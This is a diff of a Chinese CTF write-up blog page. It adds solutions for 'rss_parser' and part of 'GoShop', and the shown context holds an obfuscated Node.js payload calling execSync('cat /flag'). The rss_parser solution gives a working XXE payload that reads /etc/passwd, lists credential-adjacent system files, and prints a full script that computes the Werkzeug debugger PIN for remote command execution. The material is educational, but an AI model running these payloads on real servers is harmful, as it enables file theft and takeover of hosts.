@@ -95,7 +95,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">2.4k</span>
+            <span class="post-count">3.9k</span>
         </span>
     </span>
 
@@ -104,7 +104,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> 阅读时长≈</span>
-            <span class="post-count">12 分钟</span>
+            <span class="post-count">20 分钟</span>
         </span>
     </span>
 </div>
@@ -621,6 +621,350 @@ obj<span class="token punctuation">.</span><span class="token function">__define
     <span class="token keyword">return</span> p<span class="token punctuation">[</span><span class="token string">'mainM'</span><span class="token operator">+</span><span class="token string">'odule'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'requi'</span><span class="token operator">+</span><span class="token string">'re'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'child_pr'</span><span class="token operator">+</span><span class="token string">'ocess'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'ex'</span><span class="token operator">+</span><span class="token string">'ecSync'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'cat /flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
 <span class="token keyword">throw</span> obj<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="Week-3-rss-parser"><a href="#Week-3-rss-parser" class="headerlink" title="[Week 3]rss_parser"></a>[Week 3]rss_parser</h2><p>考点：XXE漏洞、计算pin码。<br><img src="https://img-blog.csdnimg.cn/f82184db0289425da13a12befbca8763.png" alt="1"><br>这里让我们输入url，看到xml文件可以想到可能会出现XXE漏洞，看一下源码：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> request<span class="token punctuation">,</span> redirect
+<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> unquote
+<span class="token keyword">from</span> lxml <span class="token keyword">import</span> etree
+<span class="token keyword">from</span> io <span class="token keyword">import</span> BytesIO
+<span class="token keyword">import</span> requests
+<span class="token keyword">import</span> re
+
+app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'GET'</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        feed_url <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span>
+        <span class="token keyword">if</span> <span class="token keyword">not</span> re<span class="token punctuation">.</span><span class="token keyword">match</span><span class="token punctuation">(</span><span class="token string">r'^(http|https)://'</span><span class="token punctuation">,</span> feed_url<span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
+
+        content <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>feed_url<span class="token punctuation">)</span><span class="token punctuation">.</span>content
+        tree <span class="token operator">=</span> etree<span class="token punctuation">.</span>parse<span class="token punctuation">(</span>BytesIO<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">,</span> etree<span class="token punctuation">.</span>XMLParser<span class="token punctuation">(</span>resolve_entities<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+        result <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
+
+        rss_title <span class="token operator">=</span> tree<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'/channel/title'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text
+        rss_link <span class="token operator">=</span> tree<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'/channel/link'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text
+        rss_posts <span class="token operator">=</span> tree<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">'/channel/item'</span><span class="token punctuation">)</span>
+
+        result<span class="token punctuation">[</span><span class="token string">'title'</span><span class="token punctuation">]</span> <span class="token operator">=</span> rss_title
+        result<span class="token punctuation">[</span><span class="token string">'link'</span><span class="token punctuation">]</span> <span class="token operator">=</span> rss_link
+        result<span class="token punctuation">[</span><span class="token string">'posts'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+
+        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>rss_posts<span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">10</span><span class="token punctuation">:</span>
+            rss_posts <span class="token operator">=</span> rss_posts<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">]</span>
+
+        <span class="token keyword">for</span> post <span class="token keyword">in</span> rss_posts<span class="token punctuation">:</span>
+            post_title <span class="token operator">=</span> post<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'./title'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text
+            post_link <span class="token operator">=</span> post<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'./link'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text
+            result<span class="token punctuation">[</span><span class="token string">'posts'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">'title'</span><span class="token punctuation">:</span> post_title<span class="token punctuation">,</span> <span class="token string">'link'</span><span class="token punctuation">:</span> unquote<span class="token punctuation">(</span>post_link<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+ 
+        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> feed_url<span class="token operator">=</span>feed_url<span class="token punctuation">,</span> result<span class="token operator">=</span>result<span class="token punctuation">)</span>
+
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
+    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">8000</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>其他地方没有找到可疑的。</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">tree <span class="token operator">=</span> etree<span class="token punctuation">.</span>parse<span class="token punctuation">(</span>BytesIO<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">,</span> etree<span class="token punctuation">.</span>XMLParser<span class="token punctuation">(</span>resolve_entities<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://img-blog.csdnimg.cn/0a88ca131ec844ffb15b55cb126ffc1d.png" alt="465"><br><code>etree.parse</code>解析xml数据，可能会出现漏洞。<br>在自己服务器上创建一个xml文件<code>index.xml</code></p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span>
+<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">test</span> <span class="token punctuation">[</span><span class="token internal-subset">
+&lt;!ENTITY file SYSTEM "file:///etc/passwd"></span><span class="token punctuation">]</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>rss</span> <span class="token attr-name"><span class="token namespace">xmlns:</span>atom</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2005/Atom<span class="token punctuation">"</span></span> <span class="token attr-name">version</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>2.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>channel</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&file;">&amp;file;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span><span class="token punctuation">></span></span>https://exp10it.cn/<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>link</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>item</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span><span class="token punctuation">></span></span>https://exp10it.cn/<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>link</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>item</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>channel</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>rss</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>然后开启一个http服务<br>靶机访问该文件，发现成功读取到<code>/etc/passwd</code>文件。<br><img src="https://img-blog.csdnimg.cn/a4bc997150e64f3ba3b3ab94b5067603.png" alt="1"><br>由于可以进行任意文件读取，而且还是python搭建的网站，直接读取文件计算pin码。</p>
+<h3 id="计算pin码"><a href="#计算pin码" class="headerlink" title="计算pin码"></a>计算pin码</h3><p>计算pin码所需条件</p>
+<ul>
+<li>username 在可以任意文件读的条件下读 &#x2F;etc&#x2F;passwd进行猜测</li>
+<li>modname 默认flask.app</li>
+<li>appname 默认Flask</li>
+<li>moddir flask库下app.py的绝对路径,可以通过报错拿到,如传参的时候给个不存在的变量</li>
+<li>uuidnode mac地址的十进制,任意文件读 &#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address</li>
+<li>machine_id 机器码  #linux的id一般存放在&#x2F;etc&#x2F;machine-id或&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_id，docker靶机则读取&#x2F;proc&#x2F;self&#x2F;cgroup</li>
+</ul>
+<p>读取完对应值后填入相应脚本计算pin码</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlib
+<span class="token keyword">from</span> itertools <span class="token keyword">import</span> chain
+
+probably_public_bits <span class="token operator">=</span> <span class="token punctuation">[</span>
+    <span class="token string">'app'</span>  <span class="token comment"># /etc/passwd</span>
+    <span class="token string">'flask.app'</span><span class="token punctuation">,</span>  <span class="token comment"># 默认值</span>
+    <span class="token string">'Flask'</span><span class="token punctuation">,</span>  <span class="token comment"># 默认值</span>
+    <span class="token string">'/usr/local/lib/python3.9/site-packages/flask/app.py'</span>  <span class="token comment"># 报错得到</span>
+<span class="token punctuation">]</span>
+
+private_bits <span class="token operator">=</span> <span class="token punctuation">[</span>
+    <span class="token string">'2485378088962'</span><span class="token punctuation">,</span>  <span class="token comment"># /sys/class/net/eth0/address 十进制</span>
+    <span class="token string">'fd3e34a4-6949-4575-83ed-79944fc5e148'</span>
+    <span class="token comment"># 字符串合并：1./etc/machine-id(docker不用看) /proc/sys/kernel/random/boot_id，有boot-id那就拼接boot-id 2. /proc/self/cgroup</span>
+<span class="token punctuation">]</span>
+
+<span class="token comment"># 下面为源码里面抄的，不需要修改</span>
+h <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha1<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token keyword">for</span> bit <span class="token keyword">in</span> chain<span class="token punctuation">(</span>probably_public_bits<span class="token punctuation">,</span> private_bits<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">if</span> <span class="token keyword">not</span> bit<span class="token punctuation">:</span>
+        <span class="token keyword">continue</span>
+    <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>bit<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        bit <span class="token operator">=</span> bit<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>
+    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span>bit<span class="token punctuation">)</span>
+h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b"cookiesalt"</span><span class="token punctuation">)</span>
+
+cookie_name <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"__wzd</span><span class="token interpolation"><span class="token punctuation">&#123;</span>h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token format-spec">20]</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>
+
+<span class="token comment"># If we need to generate a pin we salt it a bit more so that we don't</span>
+<span class="token comment"># end up with the same value and generate out 9 digits</span>
+num <span class="token operator">=</span> <span class="token boolean">None</span>
+<span class="token keyword">if</span> num <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
+    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b"pinsalt"</span><span class="token punctuation">)</span>
+    num <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">int</span><span class="token punctuation">(</span>h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token format-spec">09d</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span>
+
+<span class="token comment"># Format the pincode in groups of digits for easier remembering if</span>
+<span class="token comment"># we don't have a result yet.</span>
+rv <span class="token operator">=</span> <span class="token boolean">None</span>
+<span class="token keyword">if</span> rv <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
+    <span class="token keyword">for</span> group_size <span class="token keyword">in</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">:</span>
+        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">%</span> group_size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
+            rv <span class="token operator">=</span> <span class="token string">"-"</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>
+                num<span class="token punctuation">[</span>x <span class="token punctuation">:</span> x <span class="token operator">+</span> group_size<span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span>group_size<span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span>
+                <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">,</span> group_size<span class="token punctuation">)</span>
+            <span class="token punctuation">)</span>
+            <span class="token keyword">break</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        rv <span class="token operator">=</span> num
+
+<span class="token keyword">print</span><span class="token punctuation">(</span>rv<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>得到pin码，填入后开始命令执行。<br><img src="https://img-blog.csdnimg.cn/925473e1a4c4477982a13855a341e2b0.png" alt="465"></p>
+<h2 id="week3-GoShop"><a href="#week3-GoShop" class="headerlink" title="[week3] GoShop"></a>[week3] GoShop</h2><p>考点：整数溢出<br>既然是复现，那就不要为了做题而做题，着重学习这道题的考点。</p>
+<p>这道题就是让我们来买flag，价格为999999999，涉及到数字大的，那考点在这里的概率就很大。<br><img src="https://img-blog.csdnimg.cn/21fa88c2de464768b427ee4010695e0c.png" alt="1"></p>
+<pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main
+
+<span class="token keyword">import</span> <span class="token punctuation">(</span>
+	<span class="token string">"crypto/rand"</span>
+	<span class="token string">"embed"</span>
+	<span class="token string">"fmt"</span>
+	<span class="token string">"github.com/gin-contrib/sessions"</span>
+	<span class="token string">"github.com/gin-contrib/sessions/cookie"</span>
+	<span class="token string">"github.com/gin-gonic/gin"</span>
+	<span class="token string">"github.com/google/uuid"</span>
+	<span class="token string">"html/template"</span>
+	<span class="token string">"net/http"</span>
+	<span class="token string">"os"</span>
+	<span class="token string">"strconv"</span>
+<span class="token punctuation">)</span>
+
+<span class="token keyword">type</span> User <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>
+	Id    <span class="token builtin">string</span>
+	Money <span class="token builtin">int64</span>
+	Items <span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token builtin">int64</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">type</span> Product <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>
+	Name  <span class="token builtin">string</span>
+	Price <span class="token builtin">int64</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">var</span> users <span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token operator">*</span>User
+
+<span class="token keyword">var</span> products <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">*</span>Product
+
+<span class="token comment">//go:embed public</span>
+<span class="token keyword">var</span> fs embed<span class="token punctuation">.</span>FS
+
+<span class="token keyword">func</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+	users <span class="token operator">=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token operator">*</span>User<span class="token punctuation">)</span>
+	products <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">*</span>Product<span class="token punctuation">&#123;</span>
+		<span class="token punctuation">&#123;</span>Name<span class="token punctuation">:</span> <span class="token string">"Apple"</span><span class="token punctuation">,</span> Price<span class="token punctuation">:</span> <span class="token number">10</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+		<span class="token punctuation">&#123;</span>Name<span class="token punctuation">:</span> <span class="token string">"Banana"</span><span class="token punctuation">,</span> Price<span class="token punctuation">:</span> <span class="token number">50</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+		<span class="token punctuation">&#123;</span>Name<span class="token punctuation">:</span> <span class="token string">"Orange"</span><span class="token punctuation">,</span> Price<span class="token punctuation">:</span> <span class="token number">100</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+		<span class="token punctuation">&#123;</span>Name<span class="token punctuation">:</span> <span class="token string">"Flag"</span><span class="token punctuation">,</span> Price<span class="token punctuation">:</span> <span class="token number">999999999</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+	<span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">func</span> <span class="token function">IndexHandler</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+	c<span class="token punctuation">.</span><span class="token function">HTML</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token string">"index.html"</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">func</span> <span class="token function">InfoHandler</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+	s <span class="token operator">:=</span> sessions<span class="token punctuation">.</span><span class="token function">Default</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>
+
+	<span class="token keyword">if</span> s<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
+		u <span class="token operator">:=</span> uuid<span class="token punctuation">.</span><span class="token function">New</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">String</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+		users<span class="token punctuation">[</span>u<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">&amp;</span>User<span class="token punctuation">&#123;</span>Id<span class="token punctuation">:</span> u<span class="token punctuation">,</span> Money<span class="token punctuation">:</span> <span class="token number">100</span><span class="token punctuation">,</span> Items<span class="token punctuation">:</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token builtin">int64</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>
+		s<span class="token punctuation">.</span><span class="token function">Set</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">,</span> u<span class="token punctuation">)</span>
+		s<span class="token punctuation">.</span><span class="token function">Save</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+	<span class="token punctuation">&#125;</span>
+
+	user <span class="token operator">:=</span> users<span class="token punctuation">[</span>s<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
+	c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span>
+		<span class="token string">"user"</span><span class="token punctuation">:</span> user<span class="token punctuation">,</span>
+	<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">func</span> <span class="token function">ResetHandler</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+	s <span class="token operator">:=</span> sessions<span class="token punctuation">.</span><span class="token function">Default</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>
+	s<span class="token punctuation">.</span><span class="token function">Clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+	u <span class="token operator">:=</span> uuid<span class="token punctuation">.</span><span class="token function">New</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">String</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+	users<span class="token punctuation">[</span>u<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">&amp;</span>User<span class="token punctuation">&#123;</span>Id<span class="token punctuation">:</span> u<span class="token punctuation">,</span> Money<span class="token punctuation">:</span> <span class="token number">100</span><span class="token punctuation">,</span> Items<span class="token punctuation">:</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token builtin">int64</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>
+	s<span class="token punctuation">.</span><span class="token function">Set</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">,</span> u<span class="token punctuation">)</span>
+	s<span class="token punctuation">.</span><span class="token function">Save</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+	c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span>
+		<span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"Reset success"</span><span class="token punctuation">,</span>
+	<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">func</span> <span class="token function">BuyHandler</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+	s <span class="token operator">:=</span> sessions<span class="token punctuation">.</span><span class="token function">Default</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>
+	user <span class="token operator">:=</span> users<span class="token punctuation">[</span>s<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
+
+	data <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token keyword">interface</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+	c<span class="token punctuation">.</span><span class="token function">ShouldBindJSON</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>data<span class="token punctuation">)</span>
+
+	<span class="token keyword">var</span> product <span class="token operator">*</span>Product
+
+	<span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> v <span class="token operator">:=</span> <span class="token keyword">range</span> products <span class="token punctuation">&#123;</span>
+		<span class="token keyword">if</span> data<span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span> <span class="token operator">==</span> v<span class="token punctuation">.</span>Name <span class="token punctuation">&#123;</span>
+			product <span class="token operator">=</span> v
+			<span class="token keyword">break</span>
+		<span class="token punctuation">&#125;</span>
+	<span class="token punctuation">&#125;</span>
+
+	<span class="token keyword">if</span> product <span class="token operator">==</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
+		c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span>
+			<span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"No such product"</span><span class="token punctuation">,</span>
+		<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+		<span class="token keyword">return</span>
+	<span class="token punctuation">&#125;</span>
+
+	n<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> strconv<span class="token punctuation">.</span><span class="token function">Atoi</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token string">"num"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+	<span class="token keyword">if</span> n <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">&#123;</span>
+		c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span>
+			<span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"Product num can't be negative"</span><span class="token punctuation">,</span>
+		<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+		<span class="token keyword">return</span>
+	<span class="token punctuation">&#125;</span>
